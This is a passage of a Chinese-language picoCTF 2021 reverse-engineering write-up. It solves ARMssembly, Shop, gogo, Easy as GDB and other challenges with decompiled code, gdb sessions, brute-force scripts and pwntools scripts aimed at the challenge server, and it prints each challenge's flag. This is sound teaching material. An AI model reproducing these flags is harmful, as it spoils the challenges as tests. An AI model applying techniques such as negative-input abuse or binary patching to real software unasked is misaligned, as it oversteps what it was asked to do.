href="#ARMssembly-0-40-points" class="headerlink" title="ARMssembly 0 [40 points]"></a>ARMssembly 0 [40 points]</h1><p>這題就是看ASM發現在比大小，傳入兩個參數後，回傳最大者，故如果<code>182476535</code>和<code>3742084308</code>，會回傳<code>3742084308</code></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">func1:subsp, sp, #16strw0, [sp, 12]strw1, [sp, 8]ldrw1, [sp, 12]ldrw0, [sp, 8]cmpw1, w0bls.L2ldrw0, [sp, 12]b.L3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把<code>3742084308</code>轉成hex去除0x就得到flag了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">3742084308</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'picoCTF&#123;'</span><span class="token operator">+</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;df0bacd4&#125;</code></p><h1 id="speeds-and-feeds-50-points"><a href="#speeds-and-feeds-50-points" class="headerlink" title="speeds and feeds [50 points]"></a>speeds and feeds [50 points]</h1><p>nc過去後發現印出類似座標的東西，先把他存起來</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> mercury.picoctf.net <span class="token number">59953</span> <span class="token operator">></span> flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>google了一下發現這東西是Gcode -&gt; CNC在使用的</p><p>把他丟到這<a href="https://ncviewer.com/">網站</a>就跑出flag了<br><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image.png"><br><code>Flag: picoCTF&#123;num3r1ca1_cOntrO1_f3fea95b&#125;</code></p><h1 id="Shop-50-points"><a href="#Shop-50-points" class="headerlink" title="Shop [50 points]"></a>Shop [50 points]</h1><p>丟到IDA分析，從main開始追<br><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image-3.png"></p><p>接著看到main_openShop，可以看到monery &#x3D; main_menu的返回值，所以繼續追到main_menu<br><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image-1.png"></p><p>到main_menu看到v15 &#x3D; wallet - *num * 選擇價格，是值運算，代表可以輸入負數讓錢越來越多<br><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image-2.png"></p><p>直接nc過去實作<br><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image-4.png"><br>得到加密的flag，看起來是ASCII碼，使用python轉碼，得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span><span class="token comment"># 使用列表生成式將ASCII碼轉換為對應的字母</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> arr<span class="token punctuation">]</span><span class="token comment"># 將結果串聯成字串</span>result_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 印出轉換後字的</span><span class="token keyword">print</span><span class="token punctuation">(</span>result_string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;b4d_brogrammer_797b292c&#125;</code></p><h1 id="ARMssembly-1-70-points"><a href="#ARMssembly-1-70-points" class="headerlink" title="ARMssembly 1 [70 points]"></a>ARMssembly 1 [70 points]</h1><p>先把檔案載下來，發現是armv8-a架構，屬於AArch64，因為自己的系統是x86_64所以嘗試Cross-Compile and Link，跑起來時發現要輸入正確的數字才會對，所以使用shell script去暴力解</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># Cross-Compile and Link</span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-as <span class="token parameter variable">-o</span> chall_1.o chall_1.S<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-gcc <span class="token parameter variable">-o</span> chall_1.elf chall_1.o<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span><span class="token function">chmod</span> +x chall_1.elf<span class="token variable">)</span></span><span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Running with input: <span class="token variable">$counter</span>"</span>    <span class="token comment"># 透過 $() 捕捉執行後的輸出</span>    <span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qemu-aarch64 ./chall_1.elf $counter<span class="token variable">)</span></span>    <span class="token comment"># 檢查輸出是否不等於 "You Lose :(" 字串</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$output</span> <span class="token operator">!=</span> *<span class="token string">"You Lose :("</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Found the correct input: <span class="token variable">$counter</span>"</span>        <span class="token comment"># 格式要為picoCTF&#123;XXXXXXXX&#125; -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF&#123;0055aabb&#125;)</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Flag: picoCTF&#123;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"%08x"</span> $counter<span class="token variable">)</span></span>&#125;"</span>        <span class="token builtin class-name">break</span>    <span class="token keyword">fi</span>    <span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>counter <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ARMssembly-2-90-points"><a href="#ARMssembly-2-90-points" class="headerlink" title="ARMssembly 2 [90 points]"></a>ARMssembly 2 [90 points]</h1><p>把題目給的數字丟進去，轉進制就出來了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># Cross-Compile and Link</span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-as <span class="token parameter variable">-o</span> chall_2.o chall_2.S<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-gcc <span class="token parameter variable">-o</span> chall_2.elf chall_2.o<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span><span class="token function">chmod</span> +x chall_2.elf<span class="token variable">)</span></span><span class="token comment"># 執行結果: Result: 3979085410</span><span class="token comment"># 只取數值部分</span><span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qemu-aarch64 ./chall_2.elf <span class="token number">4189673334</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[0-9]*'</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"Flag: picoCTF&#123;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"%08x"</span> $output<span class="token variable">)</span></span>&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Hurry-up-Wait-100-points"><a href="#Hurry-up-Wait-100-points" class="headerlink" title="Hurry up! Wait! [100 points]"></a>Hurry up! Wait! [100 points]</h1><p>載下來後先file發現這檔案其實是elf，雖然檔名是exe</p><pre class="line-numbers language-console" data-language="console"><code class="language-console">┌──(luyee㉿DESKTOP-KADOGNG)-[~&#x2F;picoCTF&#x2F;2021&#x2F;reverse&#x2F;Hurry up! Wait!]└─$ file svchost.exesvchost.exe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;c083b0f6ecaeb1517082fb6ed0cd9e3f295ec2cc, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>gdb執行的時候噴錯：<code>error while loading shared libraries: libgnat-7.so.1</code><br>所以去載一下需要的libraries，用gdb跑起來發現會卡住，感覺就有貓膩，丟到IDA去分析<br>從main開始分析，看到會call <code>sub_1D7C</code> <code>sub_298A</code> <code>sub_1D52</code></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">main proc near...忽略mov     rdi, raxcall    ___gnat_initializecall    sub_1D7Ccall    sub_298Acall    sub_1D52call    ___gnat_finalize...忽略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每個functio都點進去看一下後發現 <code>sub_298A</code>裡面有一個delay function，delay 1000000000000000 秒難怪執行後會卡住，所以推測底下就是print flag的function</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">sub_298A proc near; __unwind &#123;push    rbpmov     rbp, rspmov     rdi, 1000000000000000call    _ada__calendar__delays__delay_for...忽略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>思路：在rdi賦值後把數值改成0</p></blockquote><p><img src="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/image-6.png" alt="Alt text"></p><p><code>Flag: picoCTF&#123;d15a5m_ftw_eab78e4&#125;</code></p><h1 id="gogo-110-points"><a href="#gogo-110-points" class="headerlink" title="gogo [110 points]"></a>gogo [110 points]</h1><p>先丟到IDA反編譯，從<code>main_main</code>中可看出使用<em>scanf</em>去讀密碼<code>_currPasswd</code>然後傳入<code>checkPasswd</code>，所以接著去看<code>checkPasswd</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_currPasswd <span class="token operator">=</span> <span class="token punctuation">(</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">runtime_newobject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>runtime__type <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>RTYPE_string_0<span class="token punctuation">)</span><span class="token punctuation">;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token punctuation">(</span>interface_ <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"Enter Password: "</span><span class="token punctuation">;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>_slice_interface_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fmt_Printf</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_slice_interface_ <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cap<span class="token punctuation">)</span><span class="token punctuation">;</span>v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>RTYPE__ptr_string<span class="token punctuation">;</span>v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> _currPasswd<span class="token punctuation">;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token punctuation">(</span>interface_ <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"%s\n"</span><span class="token punctuation">;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token number">0x100000001LL</span><span class="token punctuation">;</span><span class="token function">fmt_Scanf</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_slice_interface_ <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>typ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">main_checkPassword</span><span class="token punctuation">(</span><span class="token operator">*</span>_currPasswd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main.checkPassword</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __usercall main_checkPassword@<span class="token operator">&lt;</span>eax<span class="token operator">></span><span class="token punctuation">(</span>string input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  uint8 key<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-40h] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-20h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> input<span class="token punctuation">.</span>len <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token punctuation">)</span>    <span class="token function">os_Exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>loc_8090B18<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">"861836f13e3d627dfa375bdb8389214e"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>loc_8090FE0<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">>=</span> input<span class="token punctuation">.</span>len <span class="token operator">||</span> result <span class="token operator">>=</span> <span class="token number">0x20</span> <span class="token punctuation">)</span>      <span class="token function">runtime_panicindex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">^</span> input<span class="token punctuation">.</span>str<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> v4<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token operator">++</span>result<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>條件:<code>input.len</code>要大於32 且 <code>key[result]</code>^<code>input.str[result]</code>要等於<code>v4[result]</code></p><p>思路: 把<code>key[result]</code>和<code>input.str[result]</code>找出來後xor就拿到密碼了</p><p><code>key[result]</code> 記憶體位址：<code>$esp+$eax*1+0x4</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gef➤ hexdump byte <span class="token variable">$esp</span>+<span class="token variable">$eax</span>*1+0x4 <span class="token parameter variable">-s</span> <span class="token number">32</span>0x1844ff28     <span class="token number">38</span> <span class="token number">36</span> <span class="token number">31</span> <span class="token number">38</span> <span class="token number">33</span> <span class="token number">36</span> <span class="token number">66</span> <span class="token number">31</span> <span class="token number">33</span> <span class="token number">65</span> <span class="token number">33</span> <span class="token number">64</span> <span class="token number">36</span> <span class="token number">32</span> <span class="token number">37</span> <span class="token number">64</span>    861836f13e3d627d0x1844ff38     <span class="token number">66</span> <span class="token number">61</span> <span class="token number">33</span> <span class="token number">37</span> <span class="token number">35</span> <span class="token number">62</span> <span class="token number">64</span> <span class="token number">62</span> <span class="token number">38</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">32</span> <span class="token number">31</span> <span class="token number">34</span> <span class="token number">65</span>    fa375bdb8389214e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>input.str[result]</code> 記憶體位址：$esp+$eax*1+0x24</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gef➤  hexdump byte <span class="token variable">$esp</span>+<span class="token variable">$eax</span>*1+0x24 <span class="token parameter variable">-s</span> <span class="token number">32</span>0x1844ff48     4a <span class="token number">53</span> <span class="token number">47</span> 5d <span class="token number">41</span> <span class="token number">45</span> 03 <span class="token number">54</span> 5d 02 5a 0a <span class="token number">53</span> <span class="token number">57</span> <span class="token number">45</span> 0d    JSG<span class="token punctuation">]</span>AE.T<span class="token punctuation">]</span>.Z.SWE.0x1844ff58     05 00 5d <span class="token number">55</span> <span class="token number">54</span> <span class="token number">10</span> 01 0e <span class="token number">41</span> <span class="token number">55</span> <span class="token number">57</span> 4b <span class="token number">45</span> <span class="token number">50</span> <span class="token number">46</span> 01    <span class="token punctuation">..</span><span class="token punctuation">]</span>UT<span class="token punctuation">..</span>.AUWKEPF.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>寫成pwn script如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># password = key[result] ^ input.str[result]</span>key <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token string">"3836313833366631336533643632376466613337356264623833383932313465"</span><span class="token punctuation">)</span><span class="token builtin">input</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token string">"4a53475d414503545d025a0a5357450d05005d555410010e4155574b45504601"</span><span class="token punctuation">)</span>password <span class="token operator">=</span> xor<span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">)</span><span class="token comment"># 印出 password 但不要有 b'</span><span class="token comment"># print(f'password:&#123;password.decode()&#125;')</span><span class="token comment"># 指令 nc 過去輸入 password 和 goldfish</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'mercury.picoctf.net'</span><span class="token punctuation">,</span> <span class="token number">48728</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter Password:'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>password<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is the unhashed key?'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'goldfish'</span><span class="token punctuation">)</span><span class="token comment">#接收輸出</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;p1kap1ka_p1c0b187f1db&#125;</code></p><h1 id="ARMssembly-3-130-points"><a href="#ARMssembly-3-130-points" class="headerlink" title="ARMssembly 3 [130 points]"></a>ARMssembly 3 [130 points]</h1><p>和ARMssembly 2一樣，編譯起來把數字帶入Flag就出來了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># Cross-Compile and Link</span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-as <span class="token parameter variable">-o</span> chall_3.o chall_3.S<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-gcc <span class="token parameter variable">-o</span> chall_3.elf chall_3.o<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span><span class="token function">chmod</span> +x chall_3.elf<span class="token variable">)</span></span><span class="token comment"># Run</span><span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qemu-aarch64 ./chall_3.elf <span class="token number">2541039191</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[0-9]*'</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"Flag: picoCTF&#123;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"%08x"</span> $output<span class="token variable">)</span></span>&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;00000039&#125;</code></p><h1 id="Let’s-get-dynamic-150-points"><a href="#Let’s-get-dynamic-150-points" class="headerlink" title="Let’s get dynamic [150 points]"></a>Let’s get dynamic [150 points]</h1><p>先編譯並跑起來隨邊塞值測試</p><pre class="line-numbers language-console" data-language="console"><code class="language-console">┌──(luyee㉿DESKTOP-KADOGNG)-[~&#x2F;picoCTF&#x2F;2021&#x2F;reverse&#x2F;Let&#39;s get dynamic]└─$ gcc chall.S -o chall.o┌──(luyee㉿DESKTOP-KADOGNG)-[~&#x2F;picoCTF&#x2F;2021&#x2F;reverse&#x2F;Let&#39;s get dynamic]└─$ .&#x2F;chall.o 123Correct! You entered the flag.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到題目說Let’s get dynamic，可以想到應該是要動態偵錯</p><p><code>x/96i main</code> -&gt; 看一下main在幹嘛</p><p>看到&lt;main+385&gt;時呼叫memcmp，所以下斷點在&lt;main+385&gt; -&gt; <code>b *(main+385)</code> -&gt; <code>run</code></p><p>之後可以看到flag已經傳到 <code>$rsi</code>  ，而剛剛輸入隨便輸入的測值放在<code>$rdi</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">memcmp@plt <span class="token punctuation">(</span>   <span class="token variable">$rdi</span> <span class="token operator">=</span> 0x00007fffffffe080 → 0x0000000a66647361 <span class="token punctuation">(</span><span class="token string">"asdf<span class="token entity" title="\n">\n</span>"</span>?<span class="token punctuation">)</span>,   <span class="token variable">$rsi</span> <span class="token operator">=</span> 0x00007fffffffe040 → <span class="token string">"picoCTF&#123;dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700&#125;"</span>,   <span class="token variable">$rdx</span> <span class="token operator">=</span> 0x0000000000000031,   <span class="token variable">$rcx</span> <span class="token operator">=</span> 0x00007fffffffe040 → <span class="token string">"picoCTF&#123;dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>x/s $rsi</code>看<code>$rsi</code>的值 </p><p><code>Flag: picoCTF&#123;dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700&#125;</code></p><h1 id="Easy-as-GDB-160-points"><a href="#Easy-as-GDB-160-points" class="headerlink" title="Easy as GDB [160 points]"></a>Easy as GDB [160 points]</h1><p>可以看到這個function會返回正確的字母數</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gef➤  rinput the flag: pgef➤  x/x <span class="token variable">$ebp</span>-0x140xffffd294:0x00000001gef➤  rinput the flag: pigef➤  x/x <span class="token variable">$ebp</span>-0x140xffffd294:0x00000002gef➤  rinput the flag: picoCTF<span class="token punctuation">&#123;</span>gef➤  x/x <span class="token variable">$ebp</span>-0x140xffffd294:0x00000008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用pwntool寫一個暴力破解程式：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># /usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> string <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"gdb-gef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"file 